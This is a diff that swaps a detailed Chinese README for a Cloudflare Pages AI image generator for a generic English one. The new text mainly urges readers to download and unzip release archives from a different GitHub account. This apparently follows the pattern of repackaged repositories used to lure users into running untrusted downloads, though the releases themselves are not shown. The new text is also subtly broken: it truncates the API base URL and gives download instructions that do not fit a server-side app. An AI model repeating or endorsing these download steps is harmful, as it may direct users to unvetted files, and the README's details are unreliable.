@@ -1,210 +1,68 @@
-# ShowImageWeb - AI 图像生成器
+# 🎨 ai-image-generator-web - Simple AI Image Generation Made Easy
 
-基于 Cloudflare Pages Functions 的 AI 图像生成 Web 应用。
-- 2025-12-04 添加支持 https://ai.gitee.com/ Z-Image-Turbo API 每日免费体验 100 张
-- 2025-12-05 添加密钥自动缓存到浏览器localStorge
-## 项目结构
+## 🌐 Download the App
+[![Download ai-image-generator-web](https://img.shields.io/badge/Download-AI%20Image%20Generator-blue.svg)](https://github.com/Yashsoni443/ai-image-generator-web/releases)
+
+## 🚀 Getting Started
+This guide will help you download and run the ai-image-generator-web application on your device. This web application lets you generate unique images using AI technology. 
+
+### 💻 System Requirements
+- A computer or mobile device with internet access
+- A modern web browser (Google Chrome, Firefox, Safari, etc.)
+
+## 📥 Download & Install
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Yashsoni443/ai-image-generator-web/releases) to find the latest version of the application.
+2. **Select the Latest Release**: Look for the most recent version, usually labeled with a version number.
+3. **Download the Files**: Click on the download link to get the application files. This may be a zipped file or various file types depending on the latest release.
+4. **Unzip the Files (if needed)**: If you downloaded a zipped file, extract it to a folder of your choice.
+5. **Open the Application**: Open the `aioec.html` file in your web browser to start using the application.
+
+## 🛠️ Features
+- **AI Image Generation**: Create custom images using prompts.
+- **Flexible Control**: Adjust parameters like random seeds and seed values for various image outputs.
+- **Statistics**: Access generation time, number of images created, and more.
+- **Local Storage**: Save your image history directly in your browser.
+- **Responsive Design**: Use the app on any device without losing functionality.
+- **High-performance Deployment**: Enjoy fast performance with Cloudflare's global network.
+
+## 🔍 How It Works
+The application uses Cloudflare Pages Functions for its backend services. Below are the main API routes available:
+
+### 📡 API Routes
+- **GET /api/config**: Retrieve application configuration.
+- **POST /api/generate**: Generate an AI image based on your prompts.
+
+### ⚙️ Environment Variables
+If you plan to customize or develop this application, here are the key environment variables you may want to set in the Cloudflare Dashboard:
+
+- `API_KEY`: Your AI image generation API key.
+- `API_BASE_URL`: The base address for the API (default: `https://z-api.aio`).
+
+## 📂 Project Structure
+Here’s an overview of the project structure to give you an idea of how the application is organized:
 
 ```
-├── aioec.html                    # 主页面（内联CSS和JS）
-├── wrangler.toml                 # Workers 配置文件（保留）
-├── wrangler-pages.toml          # Pages 配置文件
-├── functions/                   # Pages Functions 目录
-│   └── api/                     # API 函数
-│       ├── generate.js          # 图像生成 API (/api/generate)
-│       └── config.js            # 配置 API (/api/config)
-├── package.json                 # 项目依赖
-└── README.md                    # 项目说明
+├── aioec.html                    # Main page (with inline CSS and JS)
+├── wrangler.toml                 # Workers configuration file (do not alter)
+├── wrangler-pages.toml           # Pages configuration
+├── functions/                    # Pages Functions directory
+│   └── api/                      # API functions
+│       ├── generate.js           # Image generation API (/api/generate)
+│       └── config.js             # Configuration API (/api/config)
+├── package.json                   # Project dependencies
+└── README.md                      # Project description
 ```
 
-## 功能特性
+## 📊 Understanding the Application
+When using the application, users can input prompts to generate images. The settings allow you to control randomness and seed values, making the images more tailored to your needs.
 
-- 🎨 AI 图像生成 - 支持自定义提示词
-- 🔧 灵活的参数控制 - 随机种子、种子数值
-- 📊 统计信息 - 生成时间、作品数量等
-- 💾 本地存储 - 历史记录保存
-- 📱 响应式设计 - 适配各种设备
-- 🚀 高性能部署 - 基于 Cloudflare 全球网络
+## 📝 Conclusion
+This guide provides everything needed to download and run the ai-image-generator-web application. Enjoy exploring the capabilities of AI image generation with ease. 
 
-## Cloudflare Pages Functions 架构
+For any questions or issues, feel free to check the repository for updates or open an issue. Your feedback helps improve the application.
 
-### API 路由
+## 💾 Links
+- Download the latest version: [Releases page](https://github.com/Yashsoni443/ai-image-generator-web/releases)  
+- View the source code: [GitHub Repository](https://github.com/Yashsoni443/ai-image-generator-web)  
 
-- `GET /api/config` - 获取应用配置
-- `POST /api/generate` - 生成 AI 图像
-
-### 环境变量
-
-在 Cloudflare Dashboard 中设置以下环境变量：
-
-- `API_KEY` - AI 图像生成 API 密钥
-- `API_BASE_URL` - API 基础地址（可选，默认：https://z-api.aioec.tech/proxy/generate）
-
-## 部署指南
-
-### 1. 准备工作
-
-确保你有：
-- Cloudflare 账户
-- AI 图像生成 API 密钥
-- Node.js 18+ （如果需要本地开发）
-
-### 2. 部署到 Cloudflare Pages
-
-#### 方法一：使用 Wrangler CLI
-
-```bash
-# 安装 Wrangler CLI
-npm install -g wrangler
-
-# 登录 Cloudflare
-wrangler login
-
-# 部署到生产环境
-wrangler pages deploy . --project-name=ai-image-generator-web
-
-# 部署到预览环境
-wrangler pages deploy . --project-name=ai-image-generator-web --branch-name=preview
-```
-
-#### 方法二：使用 GitHub 集成
-
-1. 将代码推送到 GitHub 仓库
-2. 在 Cloudflare Dashboard 中创建 Pages 项目
-3. 连接 GitHub 仓库
-4. 设置构建设置：
-   - 构建命令：`echo 'No build needed - static files with Functions'`
-   - 输出目录：`.`
-   - Functions 目录：`functions`
-5. 添加环境变量
-6. 部署
-
-### 3. 环境变量配置
-
-在 Cloudflare Pages 项目设置中添加：
-
-| 变量名 | 描述 | 示例值 |
-|--------|------|--------|
-| `API_KEY` | AI 图像生成 API 密钥 | `sk-xxxxxxxx` |
-| `API_BASE_URL` | API 基础地址 | `https://z-api.aioec.tech/proxy/generate` |
-
-### 4. 自定义域名（可选）
-
-在 Cloudflare Dashboard 中：
-1. 进入 Pages 项目设置
-2. 点击 "Custom domains"
-3. 添加你的域名并配置 DNS
-
-## 本地开发
-
-### 1. 安装依赖
-
-```bash
-npm install
-```
-
-### 2. 本地预览
-
-```bash
-# 使用 Wrangler 本地预览
-wrangler pages dev . --port=8080
-
-# 或者使用其他静态文件服务器
-python -m http.server 8080
-```
-
-### 3. 测试 API 函数
-
-本地开发时，API 函数会自动在 `/functions` 目录中查找。
-
-## 项目改造说明
-
-### 从 Cloudflare Worker 到 Pages Functions 的迁移
-
-1. **静态资源处理**
-   - Worker: 内联返回 HTML、CSS、JS
-   - Pages: 使用静态文件 + Functions 处理 API
-
-2. **路由结构**
-   - Worker: 在单个文件中处理所有路由
-   - Pages: 按路径分离到不同函数文件
-
-3. **配置文件**
-   - `wrangler.toml` → `wrangler-pages.toml`
-   - 添加 Pages 特定配置
-
-4. **CORS 处理**
-   - Pages Functions 自动处理 CORS 预检
-   - 需要在响应中添加 CORS 头
-
-## API 文档
-
-### POST /api/generate
-
-生成 AI 图像
-
-**请求头：**
-```
-Content-Type: application/json
-X-API-Key: your-api-key
-```
-
-**请求体：**
-```json
-{
-  "prompt": "一座宏伟的城堡，8K高清",
-  "seed": 42
-}
-```
-
-**响应：**
-```json
-{
-  "base64": "data:image/png;base64,iVBORw0KGgo...",
-  "success": true
-}
-```
-
-### GET /api/config
-
-获取应用配置
-
-**响应：**
-```json
-{
-  "apiBaseUrl": "https://z-api.aioec.tech/proxy/generate",
-  "features": {
-    "randomSeed": true,
-    "seedControl": true,
-    "galleryStats": true,
-    "localStorage": true
-  },
-  "limits": {
-    "maxSeed": 1000000000,
-    "minSeed": 0,
-    "maxGalleryCols": 4,
-    "minGalleryCols": 1
-  }
-}
-```
-
-## 技术栈
-
-- **前端**：原生 HTML + CSS + JavaScript
-- **后端**：Cloudflare Pages Functions
-- **部署**：Cloudflare Pages
-- **API**：第三方 AI 图像生成服务
-
-## 许可证
-
-MIT License
-
-## 支持
-
-如有问题，请通过以下方式联系：
-- 提交 GitHub Issue
-- 发送邮件至项目维护者
-
----
-
-**注意**：确保在部署前设置好所有必需的环境变量，特别是 `API_KEY`。
+We hope you enjoy using the application!
